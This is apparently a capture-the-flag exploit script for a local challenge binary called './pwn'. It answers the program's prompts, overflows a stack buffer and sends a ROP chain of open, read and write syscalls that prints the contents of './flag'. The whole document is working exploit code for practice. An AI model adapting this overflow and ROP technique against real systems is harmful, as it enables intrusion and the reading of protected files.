from kk import *
context(arch='amd64', os='linux')
#p = remote('192.168.127.12', 10001)
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

syscall = 0x0000000000401272
bss = 0x4040C0
flag = 0x4040CC      
K,L = libcrop(elf)

#GDB(p,"b *0x4013a9")
p.recvuntil(b'Tell me your name!')
p.send(b"./flag")

p.recvuntil(b'> ')
p.send(b"Let'go!\x00")

p.recvuntil(b"The best way to do this is to forge an officer's license.")
p.send(b"a"*32+b"SpaceDraG0n\x00")

p.recvuntil(b"[Task 2: Keep your panic below 100]")
p.send(b"a"*64+b"\x00")

p.recvuntil(b"[Task 3: Exploit vulnerabilities to collect core data!]")
payload = b'a'*(0x40+8) + p64(K['pop_rdi']) + p64(bss) + p64(K['pop_rsi']) 
payload += p64(0) + p64(K['pop_rax']) + p64(2) + p64(K['syscall_ret']) 

payload += p64(K['pop_rdi']) + p64(3) + p64(K['pop_rsi']) + p64(flag) + p64(K['pop_rdx']) 
payload += p64(0x100) + p64(K['pop_rax']) + p64(0) + p64(K['syscall_ret']) 

payload += p64(K['pop_rdi']) + p64(1) + p64(K['pop_rsi']) + p64(flag) + p64(K['pop_rdx']) 
payload += p64(0x100) + p64(K['pop_rax']) + p64(1) + p64(K['syscall_ret']) 
p.send(payload)

p.interactive()
